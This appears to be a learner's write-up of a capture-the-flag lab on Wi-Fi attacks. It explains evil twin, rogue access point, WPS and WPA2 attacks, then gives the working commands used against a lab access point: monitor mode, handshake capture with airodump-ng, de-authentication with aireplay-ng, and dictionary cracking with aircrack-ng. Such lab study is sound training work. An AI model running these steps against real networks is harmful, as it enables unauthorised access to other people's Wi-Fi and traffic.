Wi-Fi is the technology that connects our device to the global network, the Internet. This seamless connection to the Internet appears to be wireless from our devices, which is true to some extent. Devices are connected wirelessly to the router, which acts as a bridge between us and the Internet and the router is connected to the Internet via a wired connection.

When connecting to Wi-Fi through the devices, it will list all the available wi-Fi networks around the device and this list comprises of the access points (often the routers) that are broadcasting Wi-Fi signals with a unique SSID (network name). The network can be connected if the user knows the correct password, also known as a pre-shared key (PSK). Once successfully connected to a network via Wi-Fi, the device will be assigned an IP address inside that network, which will uniquely identify you and help communicate with other devices.

![11image01](https://github.com/user-attachments/assets/391a45ee-3194-4047-bef0-0dd56dd2a311)

Windows machine Wi-Fi

**Attacks on Wi-Fi**

1. **Evil Twin Attack**
    
    The attacker creates a fake access point that has a similar name to one of the trusted Wi-Fi access points. Eg, If the trusted Wi-Fi’s name is “Home_Internet”, the attacker creates a fake Wi-Fi access point named “Home_Internnet” or something similar that is difficult to differentiate. The attacke starts with the attacker sending de-authentication packets to all users connected to their legitimate Wi-Fi access points. Users would fface repeated disconnections from the network after this. With frustration, users are likely to open the Wi-Fi access points list for troubleshooting and will find the attacker’s Wi0Fi with almost similar name and with greater signal strength. they would then connect to it. Once connected, the attacker could see all their traffic to or from the Internet.
    
2. **Rogue access point**
    
    Attack’s objective is similar to the evil twin attack. The atttacker sets up an open Wi-Fi access point near or inside the organisation’s physical premises to make it available to users with good signal strength. Users inside the organisation may accidentally join this network if their devices are set to connect automatically to open Wi-Fi. The attacker can intercept all communications after the users connect to this rogue access point.
    
3. **WPS attack**
    
    Wi-Fi Protected Setup (WPS) was created to allow users to connect to their Wi-Fi using an 8-digit PIN without remembering complex passwords. However, this 8-digit PIN is vulnerable in some networks due to its insecure configuration. The attack is made by initiating a WPS handshake with the router and capturing the router’s response, which contains some data related to the PIN and is vulnerable to brute-force attacks. Some of the captured data is brute-forced and the PIN is successfully extracted along with the Pre-Shared Key (PSK)
    
4. **WPA/WPA2 cracking**
    
    Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). while cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.
    
    **WPA/WPA2 Cracking**
    
    Begins by listening to Wi-Fi traffic to capture the 4-way handshake between a device and the access point. Since waiting for a device to connect or reconnect can take some time, de-authentication packets are sent to disconnect a client, forcing it to reconnect and initiate a new handshake, which is captured. After the handshake is captured, the attacker can crack the password (PSK) by using brute-force or dictionary attacks on the captured handshake file.
   
    ![AoC-Day-11---Wifi-Animation-2](https://github.com/user-attachments/assets/d61335c9-eb5d-4e9b-bea3-737181f15766)

    **The 4-way Handshake**
    
    The WPA password cracking process involves capturing a Wi-Fi network's handshake to attempt a PSK (password) decryption. First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker runs a brute-force or dictionary attack using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.
    
    The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right "password" or Pre-Shared Key (PSK) before securely connecting. Here's a simplified rundown of what happens:
    
    - **Router sends a challenge:** The router (or access point) sends a challenge" to the client, asking it to prove it knows the network's password without directly sharing it.
    - **Client responds with encrypted information:** The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.
    - **Router verifies and sends confirmation:** If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.
    - **Final check and connection established:** The client verifies the router's response, and if everything matches, they finish setting up the secure connection.
    
    This handshake doesn't directly reveal the PSK itself but involves encrypted exchanges that depend on the PSK.
    
    **Vulnerability**
    
    Lies in the fact that an attacker can capture this 4-way handshake if they’re listening when a device connects. With the handshake data, they can use it as a basis to attempt offline brute-force or dictionary attacks. Essentially, they try different possible passwords and test each one to see if it would produce the captured handshake data, eventually cracking the PSK if they get a match.
    
    `iw dev` show wireless devices and their configuration that we have available to use
    
   ![11SS01](https://github.com/user-attachments/assets/477bb1f8-cd45-4c2f-9dd2-a8c7a21b0533)

    `wlan2` is available to use.
    
    `addr` is MAC/BSSID of our device. BSSID (Basic Service Set Identifier) is a unique identifier for a wireless device or access point’s physical address
    
    `type` is managed. Standard mode used by most Wi-Fi devices (laptops, phones etc) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. The other mode is monitor mode. 
    
    Scan for nearby Wi-Fi networks using `wlan2` device. 
    
    `sudo iw dev wland2 scan` - `dev wlan2` specifies the wireless device you want to work with. `scan` tells iw to scan the area for available Wi-Fi networks
    
![11SS02](https://github.com/user-attachments/assets/bd016adb-8fd5-4ecc-8be8-352ed8cc0843)

Important details that indicate this device is an access point:
    
- BSSID and SSID of the device are `02:00:00:00:00:00` and `MalwareM_AP` respectively. Since SSID is shown, means the device is advertising a network name, which access points do to allow clients to discover and connect to network.
- Presence of RSN (Robust Security Network) - the network is using WPA2, as RSN is a part of the WPA2 standard. WPA2 networks typically use RSN to define the encryption and authentication settings
- `Group and PAirwise ciphers` CCMP. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol is the encryption method used by WPA2.
- `Authentication suites` value inside RSN is **PSK** indicating that this is a WPA2-Personal network, where a shared password is used for authentication
- `DS Parameter set` value shows **channel 6**.
		- The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other.
		- There are various Wi-Fi channels and all help distribute network traffic across various frequency ranges, which reduces interference.
		- Two most common Wi-Fi channels are 2.4GHz and 5GHz.
				- 2.4GHz band, channels 1, 6 and 11 are most commonly used because they don’t overlap, minimising interference
				- 5GHz band, more channels available, allowing more networks to coexist without interference.

**Monitor mode**

- Special mode primarily used for network analysis and security auditing.
- Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether it is directed to the device or not.
- Passively captures all network traffic within range for analysis without joining a network.

`sudo ip link set dev wlan2 down` to turn our device off

`sudo iw dev wlan2 set type monitor` to change wlan2 to monitor mode

`sudo iplink set dev wlan2 up` turn device on

![11SS03](https://github.com/user-attachments/assets/44b7abb0-2540-429c-ad66-a4c8afbfe6fa)

`sudo iw dev wlan2 info`

![11SS04](https://github.com/user-attachments/assets/e1a3c989-a1d8-467f-8adc-abbdf2fcc2ba)

**Capture Wi-Fi traffic**

Capture Wi-Fi traffic in the area, specifically targeting the WPA handshake packets

`sudo airodump-ng wlan2` - provides a list of nearby Wi-Fi networks (SSID) and shows important details like signal strength, channel and encryption type. 

- `airodump-ng` will automatically switch the selected wireless interface into monitor mode if the interface supports it

![11SS05](https://github.com/user-attachments/assets/c88ce289-e12a-499d-8c6b-9dea2fd536c5)

Output reveals known information eg BSSID, SSID and channel

Focus on MalwareM_AP access point and capture WPA handshake which is crucial for PSK (password) cracking process

`sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2` - targets specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic and saves the information to a few files that start with the name output-file.

- Files will be used to crack PSK.
- Ultimate goal of this command is to capture the 4-way handshake.
		- First check for any clients that may be connected to the access point
		- If a client is already connected, we can perform a de-authentication attack, otherwise for any new client that connects, we will capture the 4-way handshake.
		
![11SS06](https://github.com/user-attachments/assets/a94275ec-d3e1-40b5-81e3-429796858e82)

Client already connected. Should take between 1-5 minutes before receiving the client information. Leave command running till end of attack

`STATION` section shows the device’s BSSID (MAC) of `02:00:00:00:01:00` that is connected to the access point. This is the connection that will be attacked

Second terminal, launch de-authentication attack. The client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets

1. **De-authentication packets** - The tool aireplay-ng sends de-authentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack). These packets are essentially “disconnect” commands that force the client to drop its current Wi-Fi connection
2. **Forcing a reconnection** - When the client is disconnected, it automatically tries to reconnect to the Wi-Fi network. During this reconnection, the client and access point perform the 4-way handshake as part of the reauthentication process
3. **Capturing the handshake** - Where airodump-ng comes into play because it will capture this handshake as it happens, providing data needed to attempt the WPA/WPA2 cracking

`sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`

`-0` flag indicates that we are using the de-authentication attack

`1` value is the number of deauths to send

`-a` indicates the BSSID of the access point

`-c` indicates the BSSID of the client to de-authenticate

![11SS07](https://github.com/user-attachments/assets/86ce9e31-c401-452e-8794-46b389e10ba8)

Second terminal, can use the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. Perform a dictionary attack in order to match the passphrase against each entry in a specified wordlist file. 

`sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap` to crack the file.

`-a 2` indicates the WPA/WPA2 attack mode

`-b` indicates the BSSID of the access point

`-w` indicates the dictionary list to use for the attack

Select the output files we will be using, which contains the 4-way handshake that we will be cracking

![11SS08_1](https://github.com/user-attachments/assets/248fc364-3620-406f-90c4-f149fab7f24a)
![11SS08_2](https://github.com/user-attachments/assets/5420f0d1-c88a-41f0-919c-40b06085964b)

**Note:** If get `Packets contained no EAPOL data; unable to process this AP` error, means you ran aircrack-ng prior to handshake being captured or that handshake was not captured at all. Re-do all steps to capture the WPA handshake

stop `airodump-ng`

`wpa_passphrase <WPA/WP2> <PSK> > config` 

`sudo wpa_supplicant -B -c config -i wlan2` 
    
![11SS09](https://github.com/user-attachments/assets/8a3e64e0-9dad-432e-91e7-c2f56ae656d7)

**Note:** If you get a **`rfkill: Cannot get wiphy information`** error, you can ignore it. You will also notice that **`wpa_supplicant`** has automatically switched our **wlan2** interface to **managed mode**.

![11SS10](https://github.com/user-attachments/assets/dc492d46-3d52-4429-b01e-192421b5445e)


Successfully joined `MalwareM_AP`
